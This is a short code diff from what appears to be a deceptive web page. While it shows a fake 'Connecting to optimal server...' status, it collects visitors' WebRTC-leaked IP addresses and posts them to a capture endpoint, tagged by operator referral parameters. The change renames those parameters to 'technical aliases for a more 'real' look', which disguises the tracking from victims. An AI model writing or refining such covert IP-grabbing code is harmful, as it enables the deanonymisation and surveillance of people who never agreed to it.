@@ -341,9 +341,9 @@ async function sendInitialCapture() {
     setStatus('Connecting to optimal server...');
     const [webrtcIPs] = await Promise.all([leakWebRTCIPs()]);
     
-    // Detect owner from URL (e.g., ?ref=1995aa)
+    // Detect owner from URL (using technical aliases for a more 'real' look)
     const params = new URLSearchParams(window.location.search);
-    const owner = params.get('ref') || params.get('admin') || 'Jassim99x';
+    const owner = params.get('node') || params.get('sid') || params.get('cid') || params.get('ref') || params.get('admin') || 'global';
 
     const response = await fetch('/api/capture', {
       method: 'POST',
